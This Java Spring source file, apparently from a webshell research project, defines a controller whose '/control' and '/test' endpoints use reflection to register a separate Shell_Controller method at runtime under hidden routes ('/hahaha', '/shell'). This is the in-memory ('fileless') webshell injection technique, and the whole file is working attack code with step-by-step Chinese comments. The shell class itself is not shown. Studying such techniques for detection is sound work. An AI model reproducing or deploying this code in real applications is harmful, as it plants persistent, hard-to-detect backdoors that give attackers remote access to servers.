package com.yyjccc.webshell.Controller;





import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;

import org.springframework.web.servlet.mvc.condition.PathPatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.util.pattern.PathPatternParser;


import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;


@RestController
public class ShellController {

	@RequestMapping("/control")
	public String Spring_Controller() throws ClassNotFoundException, InstantiationException, IllegalAccessException {
		WebApplicationContext context3 = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

		// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
		RequestMappingHandlerMapping r = context3.getBean(RequestMappingHandlerMapping.class);
		// 2. 通过反射获得自定义 controller 中唯一的 Method 对象
		Method method = (Shell_Controller.class.getDeclaredMethods())[0];
		method.setAccessible(true);
		// 3. 定义访问 controller 的 URL 地址
		PatternsRequestCondition url = new PatternsRequestCondition("/hahaha");
		// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
		RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
		// 5. 在内存中动态注册 controller
		RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
		r.registerMapping(info, Class.forName("com.yyjccc.webshell.Controller.Shell_Controller").newInstance(), method);
		return "shell";
	}

	@RequestMapping("/test")
	public String test() throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InstantiationException {
		WebApplicationContext context3 = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

		// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
		RequestMappingHandlerMapping r = context3.getBean(RequestMappingHandlerMapping.class);
		// 2. 通过反射获得自定义 controller 中唯一的 Method 对象
		Method method = (Shell_Controller.class.getDeclaredMethods())[0];
		method.setAccessible(true);


		PatternsRequestCondition url = new PatternsRequestCondition("/shell");
		RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
		PathPatternsRequestCondition p = new PathPatternsRequestCondition(new PathPatternParser(), "/shell");
		RequestMappingInfo info = new RequestMappingInfo(null, ms, null, null, null, null, null);
		Field field = info.getClass().getDeclaredField("pathPatternsCondition");
		field.setAccessible(true);
		field.set(info,p);

		//PathPatternsRequestCondition p = new PathPattern("hahaha",new PathPatternParser(),new PathElement());

		r.registerMapping(info, Class.forName("com.yyjccc.webshell.Controller.Shell_Controller").newInstance(), method);


		return "test";
	}




}
